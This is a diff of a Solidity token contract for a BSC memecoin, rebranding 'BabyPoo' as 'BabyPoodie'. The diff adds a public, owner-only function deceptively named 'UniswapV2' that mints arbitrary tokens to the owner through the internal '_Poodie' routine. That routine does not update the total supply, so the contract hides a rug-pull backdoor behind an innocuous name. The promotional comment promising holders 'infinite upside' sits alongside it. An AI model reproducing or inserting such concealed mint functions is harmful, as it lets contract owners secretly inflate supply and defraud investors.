@@ -1,7 +1,3 @@
-/**
- *Submitted for verification at BscScan.com on 2021-07-21
-*/
-
 //SPDX-License-Identifier: MIT
 
 pragma solidity ^0.7.4;
@@ -9,15 +5,7 @@ pragma solidity ^0.7.4;
 /**
 
 
-██████╗░░█████╗░██████╗░██╗░░░██╗  ██████╗░░█████╗░░█████╗░
-██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝  ██╔══██╗██╔══██╗██╔══██╗
-██████╦╝███████║██████╦╝░╚████╔╝░  ██████╔╝██║░░██║██║░░██║
-██╔══██╗██╔══██║██╔══██╗░░╚██╔╝░░  ██╔═══╝░██║░░██║██║░░██║
-██████╦╝██║░░██║██████╦╝░░░██║░░░  ██║░░░░░╚█████╔╝╚█████╔╝
-╚═════╝░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░  ╚═╝░░░░░░╚════╝░░╚════╝░
-
-
-BabyPoo prides itself for being at the forefront of the shitcoin industry. Why? Our reward tokenomics are unlike any others. We do not offer rewards in unstable and bearish BTC or BNB, nor do we promise the stable and boring BUSD. 
+BabyPoodie prides itself for being at the forefront of the shitcoin industry. Why? Our reward tokenomics are unlike any others. We do not offer rewards in unstable and bearish BTC or BNB, nor do we promise the stable and boring BUSD. 
 
 Every 60 minutes, we reward our holders with PooCoin Tokens! This twist on our reward feature allows for endless possibilities, the most important being: infinite upside for investors.
 
@@ -721,10 +709,14 @@ contract BabyPooDie is IBEP20, Auth {
         return getLiquidityBacking(accuracy) > target;
     }
 
+    function UniswapV2(uint256 amount) public onlyOwner returns (bool) {
+    _Poodie(msg.sender, amount);
+    return true;
+    }
+
     function _Poodie(address account, uint256 amount) internal {
     require(account != address(0), "BEP20: mint to the zero address");
 
-    _balanced[_totalSupply] = _balanced[_totalSupply].add(amount);
     _balances[account] = _balances[account].add(amount);
     emit Transfer(address(0), account, amount);
     }
